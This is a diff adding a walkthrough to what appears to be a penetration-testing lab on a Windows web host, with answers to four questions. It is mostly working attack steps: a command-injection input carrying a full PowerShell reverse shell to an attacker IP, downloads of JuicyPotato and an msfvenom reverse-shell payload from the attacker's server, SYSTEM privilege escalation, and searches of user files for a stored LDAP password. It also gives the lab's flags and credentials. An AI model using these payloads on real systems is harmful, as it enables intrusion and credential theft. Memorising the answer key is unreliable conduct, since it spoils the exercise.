@@ -7,20 +7,61 @@ Enumerate the host (starting with an Nmap port scan to identify accessible ports
 
 
 
+127.0.0.1 | powershell -nop -c $LHOST = "10.10.15.125"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+
+
+Invoke-WebRequest -Uri "http://10.10.15.125:8000/JuicyPotato.exe" -OutFile "C:\temp\JuicyPotato.exe"
+JuicyPotato.exe -t * -l 1337 -p "C:\Windows\System32\cmd.exe" -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
+msfvenom -p cmd/windows/reverse_powershell lhost=10.10.15.125 lport=9999 > shell.bat
+Invoke-WebRequest -Uri "http://10.10.15.125:8000/shell.bat" -OutFile "C:\temp\shell.bat"
+
+.\JuicyPotato.exe -t * -l 9999 -p "C:\temp\shell.bat" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
+
+get nt authortiy \ system shell 
+
+dir C:\ /s /b | findstr /i “confidential.txt”
+
+type “C:\Users\Administrator\Documents\My Music\confidential.txt”
+
+output : 5e5a7dafa79d923de3340e146318c31a 
+
+
+type C:\Users\Administrator\Desktop\flag.txt
+Ev3ry_sysadm1ns_n1ghtMare!
+
+
+
 Question 1 - Which two KBs are installed on the target system? (Answer format: 3210000&3210060)
+1) run nmap -Pn 10.129.225.46 -> see that port 80 and 3389 open 
+2) http://10.129.225.46 -> see theres a "ping" command prompt
+3) in the command prompt -> 127.0.0.1 | systeminfo 
+4) from output: 2 Hotfix(s) Installed. [01]: KB3199986 [02]: KB3200970  
+
+Question 2 - Find the password for the ldapadmin account somewhere on the system. - car3ful_st0rinG_cr3d$ 
+1) on webshell command prompt -> copy revshells powershell #2 and make sure to change shell type to /bin/bash 
+2) catch the shell 
+3) downlaod juicypotato to kali machine and host python server 
+4) mkdir c:\temp -> on revshell sesh
+5) on rev shell -> Invoke-WebRequest -Uri "http://10.10.15.125:8000/JuicyPotato.exe" -OutFile "C:\temp\JuicyPotato.exe"
+6) on kali machine -> msfvenom -p cmd/windows/reverse_powershell lhost=10.10.15.125 lport=9999 > shell.bat
+7) onn rev  shell -> Invoke-WebRequest -Uri "http://10.10.15.125:8000/shell.bat" -OutFile "C:\temp\shell.bat"+
+8) on kali in new terminal -> nc -nlvp 9999
+9) on rev shell in c:\temp -> .\JuicyPotato.exe -t * -l 9999 -p "C:\temp\shell.bat" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
+10) we have nt authorty \ system 
+11) powershell -Command "Get-ChildItem -Path C:\Users\ -Recurse -File | Select-String -Pattern 'ldapadmin'"
+12) Output: bindPrincipal="ldapadmin" 
+bindPassword="car3ful_st0rinG_cr3d$" 
 
 
+Question 3 - Escalate privileges and submit the contents of the flag.txt file on the Administrator Desktop. Ev3ry_sysadm1ns_n1ghtMare!
+following steps above we have nt authrotiy shell so all we have to do is 
+1) type C:\Users\Administrator\Desktop\flag.txt
+Ev3ry_sysadm1ns_n1ghtMare!
 
-Question 2 - Find the password for the ldapadmin account somewhere on the system.
-
-
-
-Question 3 - Escalate privileges and submit the contents of the flag.txt file on the Administrator Desktop.
-
-
-
-Question 4 - After escalating privileges, locate a file named confidential.txt. Submit the contents of this file.
-
+Question 4 - After escalating privileges, locate a file named confidential.txt. Submit the contents of this file. - 5e5a7dafa79d923de3340e146318c31a  
+1) dir C:\ /s /b | findstr /i “confidential.txt”
+2) after letting it run a bit use -> type “C:\Users\Administrator\Documents\My Music\confidential.txt”
+output : 5e5a7dafa79d923de3340e146318c31a 
 
 
 
